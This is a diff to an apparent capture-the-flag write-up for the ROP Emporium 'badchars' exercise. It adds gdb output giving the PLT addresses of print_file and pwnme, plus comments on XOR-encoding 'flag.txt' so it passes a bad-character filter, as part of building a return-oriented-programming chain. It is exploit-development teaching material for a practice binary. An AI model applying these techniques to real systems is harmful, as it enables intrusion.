@@ -20,6 +20,12 @@ readelf
 .data = 0x601028 >>> dataSect = 0x601028 + 0x8
 ...
 ```
+print_file function plt address:
+```
+plt 
+Breakpoint 1 at 0x400510 (print_file@plt)
+Breakpoint 2 at 0x400500 (pwnme@plt)
+```
 We also need some gadget to do following operations, write to data section, move data section address to rdi register, do the xor operation.
 ```
 ROPgadget --binary badchars
@@ -39,6 +45,10 @@ We need to find xor pairs to bypass bad characters checking. Using xor_pair in p
 ```
 xor_pair(b'flag.txt')
 >>> (b'\x01\x01\x01\x01\x01\x01\x01\x01', b'gm`f/uyu')
+# '`' ^ 1 = 'a'
+# 'f' ^ 1 = 'g'
+# '/' ^ 1 = '.'
+# 'y' ^ 1 = 'x'
 ```
 We only need to xor bad characters in "flag.txt". Then the string we write to data section will be:
 ```
